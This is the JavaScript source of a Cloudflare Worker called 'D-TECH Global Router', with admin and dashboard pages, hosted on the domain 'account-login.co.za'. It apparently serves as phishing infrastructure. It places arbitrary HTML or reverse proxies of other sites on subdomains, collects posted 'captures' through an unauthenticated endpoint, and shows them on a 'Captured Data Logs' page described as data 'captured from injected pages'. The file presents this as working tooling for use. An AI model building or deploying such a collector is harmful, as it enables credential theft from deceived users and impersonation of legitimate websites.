/**
 * 🚀 D-TECH GLOBAL ROUTER V6.0 (Simplified)
 * LOCATION: Cloudflare Worker
 */

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname; 
    const ROOT_DOMAIN = "account-login.co.za"; // Ensure this matches your actual domain
    let subdomain = null;

    // --- 1. ADMIN PANEL & API ---
    // Access the Admin Panel at /admin on the root domain or any subdomain
    if (url.pathname === '/admin') {
      return new Response(renderAdminPanel(), {
        headers: { 'Content-Type': 'text/html' }
      });
    }

    // Access the Captures Dashboard
    if (url.pathname === '/admin/captures') {
      return new Response(renderCapturesDashboard(), {
        headers: { 'Content-Type': 'text/html' }
      });
    }

    // Handle API requests from the Admin Panel
    if (url.pathname === '/api/save' && request.method === 'POST') {
      return handleSaveRequest(request, env);
    }

    // Handle Capture Requests
    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return handleCaptureRequest(request, env);
    }

    // Handle Fetch Captures (API)
    if (url.pathname === '/api/captures' && request.method === 'GET') {
      return handleGetCaptures(env);
    }

    // --- 2. SUBDOMAIN ROUTING ---

    // Parse Subdomain
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    // If no subdomain (or 'www'), serve a default page or 404
    if (!subdomain || subdomain === 'www') {
       return new Response("<h1>Welcome to D-TECH Cloud</h1><p>Visit <a href='/admin'>/admin</a> to manage subdomains or <a href='/admin/captures'>/admin/captures</a> to view data.</p>", {
         headers: { 'Content-Type': 'text/html' }
       });
    }

    // Lookup Subdomain in KV
    // Requires 'SUBDOMAINS' binding to KV namespace
    const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

    if (!data) {
      return new Response(render404(subdomain), { status: 404, headers: { 'Content-Type': 'text/html' } });
    }

    // --- 3. SERVE CONTENT ---

    if (data.type === 'HTML') {
      // Serve stored HTML directly
      return new Response(data.content, {
        headers: { 'Content-Type': 'text/html' }
      });
    }

    if (data.type === 'PROXY') {
      // Fetch content from the target URL (Reverse Proxy)
      try {
        const targetUrl = data.content;

        // Prepare the request to the target
        // We generally want to forward the path and query string
        const forwardUrl = new URL(targetUrl);
        forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
        forwardUrl.search = url.search;

        const proxyResponse = await fetch(forwardUrl.toString(), {
          headers: {
            'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
            // Do NOT forward the original Host header, let fetch set it to the target's host
          }
        });

        // Create a new response to modify headers if needed (e.g. CORS)
        const response = new Response(proxyResponse.body, proxyResponse);
        // You might need to rewrite links in the HTML here if they are absolute,
        // but for now we just proxy the content.
        return response;

      } catch (err) {
        return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
      }
    }

    return new Response("Configuration Error: Unknown Type", { status: 500 });
  }
};

// --- HELPER FUNCTIONS ---

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;

    if (!subdomain || !type || !content) {
      return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
    }

    const entry = {
      type: type, // 'HTML' or 'PROXY'
      content: content,
      updated: Date.now()
    };

    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));

    return new Response(JSON.stringify({ success: true, subdomain, type }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();

    // Generate a unique key for this capture
    // Structure: capture::{timestamp}::{random_uuid}
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();
    const key = `capture::${timestamp}::${uuid}`;

    // Store the raw captured data
    await env.SUBDOMAINS.put(key, JSON.stringify({
      timestamp: timestamp,
      data: body
    }));

    return new Response(JSON.stringify({ success: true, key: key }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetCaptures(env) {
  try {
    // List keys with prefix 'capture::'
    // Default limit is 1000 which is plenty for now.
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys;

    // Keys are lexicographically sorted by timestamp prefix (capture::timestamp::uuid).
    // Older entries are first. We want the latest entries.
    // To respect subrequest limits (usually 50), we only fetch the last 20 entries.
    const latestKeys = keys.slice(-20).reverse(); // Last 20, reversed to show newest first

    const promises = latestKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);

    return new Response(JSON.stringify({ success: true, data: results }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
     return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

function render404(subdomain) {
  return `<html><body style="text-align:center; font-family: sans-serif; padding: 50px;">
    <h1>404 - Subdomain Not Found</h1>
    <p>The subdomain <strong>${subdomain}</strong> is not configured.</p>
  </body></html>`;
}

function renderAdminPanel() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Admin</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        textarea { height: 150px; font-family: monospace; }
        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
        button:hover { background: #005bb5; }
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }
        .hidden { display: none; }
        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .nav-links { margin-bottom: 20px; text-align: right; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="/admin/captures">View Captured Data &rarr;</a>
        </div>
        <h1>🚀 Cloud Admin Panel</h1>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('html')">Deploy HTML</div>
            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy</div>
        </div>

        <!-- HTML Form -->
        <div id="html-form" class="form-section">
            <div class="form-group">
                <label>Subdomain</label>
                <input type="text" id="html-subdomain" placeholder="e.g., mysite">
            </div>
            <div class="form-group">
                <label>HTML Content</label>
                <textarea id="html-content" placeholder="<html><body><h1>Hello World</h1></body></html>"></textarea>
            </div>
            <button onclick="save('HTML')">Deploy Site</button>
        </div>

        <!-- Proxy Form -->
        <div id="proxy-form" class="form-section hidden">
            <div class="form-group">
                <label>Subdomain</label>
                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
            </div>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="proxy-url" placeholder="https://example.com">
            </div>
            <button onclick="save('PROXY')">Create Proxy</button>
        </div>

        <div id="message"></div>
    </div>

    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));

            if (tab === 'html') {
                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
                document.getElementById('html-form').classList.remove('hidden');
            } else {
                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
                document.getElementById('proxy-form').classList.remove('hidden');
            }
        }

        async function save(type) {
            const btn = document.querySelector('button');
            const originalText = btn.innerText;
            btn.innerText = 'Saving...';
            btn.disabled = true;

            const messageEl = document.getElementById('message');
            messageEl.style.display = 'none';
            messageEl.className = '';

            let subdomain, content;

            if (type === 'HTML') {
                subdomain = document.getElementById('html-subdomain').value;
                content = document.getElementById('html-content').value;
            } else {
                subdomain = document.getElementById('proxy-subdomain').value;
                content = document.getElementById('proxy-url').value;
            }

            if (!subdomain || !content) {
                showMessage('Please fill in all fields.', 'error');
                btn.innerText = originalText;
                btn.disabled = false;
                return;
            }

            try {
                const response = await fetch('/api/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ subdomain, type, content })
                });

                const result = await response.json();

                if (result.success) {
                    showMessage(\`Success! \${subdomain}.account-login.co.za is now active.\`, 'success');
                } else {
                    showMessage('Error: ' + result.error, 'error');
                }
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }

            btn.innerText = originalText;
            btn.disabled = false;
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = 'block';
        }
    </script>
</body>
</html>
  `;
}

function renderCapturesDashboard() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Data Dashboard</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #d32f2f; }
        .nav-links { margin-bottom: 20px; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
        th { background: #fafafa; color: #555; }
        tr:hover { background: #f9f9f9; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; }
        .empty { text-align: center; color: #888; padding: 40px; }
        .timestamp { color: #666; font-size: 0.9em; white-space: nowrap; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="/admin">&larr; Back to Admin Panel</a>
        </div>
        <h1>🕵️ Captured Data Logs</h1>
        <p>Real-time data captured from injected pages.</p>

        <div id="loading">Loading data...</div>
        <table id="data-table" style="display:none;">
            <thead>
                <tr>
                    <th style="width: 180px;">Time</th>
                    <th>Data Payload</th>
                </tr>
            </thead>
            <tbody id="table-body">
            </tbody>
        </table>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('/api/captures');
                const result = await response.json();

                if (result.success) {
                    renderTable(result.data);
                } else {
                    document.getElementById('loading').innerText = 'Error loading data: ' + result.error;
                }
            } catch (err) {
                document.getElementById('loading').innerText = 'Network Error: ' + err.message;
            }
        }

        function renderTable(data) {
            const tbody = document.getElementById('table-body');
            const table = document.getElementById('data-table');
            const loading = document.getElementById('loading');

            loading.style.display = 'none';
            table.style.display = 'table';
            tbody.innerHTML = '';

            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="2" class="empty">No captured data yet.</td></tr>';
                return;
            }

            data.forEach(item => {
                const row = document.createElement('tr');

                // Format timestamp
                const date = new Date(item.timestamp);
                const timeStr = date.toLocaleString();

                // Format JSON data safely
                const jsonStr = JSON.stringify(item.data, null, 2);

                // Use DOM methods to prevent XSS
                const timeCell = document.createElement('td');
                timeCell.className = 'timestamp';
                timeCell.textContent = timeStr;

                const dataCell = document.createElement('td');
                const pre = document.createElement('pre');
                pre.textContent = jsonStr;
                dataCell.appendChild(pre);

                row.appendChild(timeCell);
                row.appendChild(dataCell);

                tbody.appendChild(row);
            });
        }

        // Load on start
        loadData();

        // Refresh every 30 seconds
        setInterval(loadData, 30000);
    </script>
</body>
</html>
  `;
}
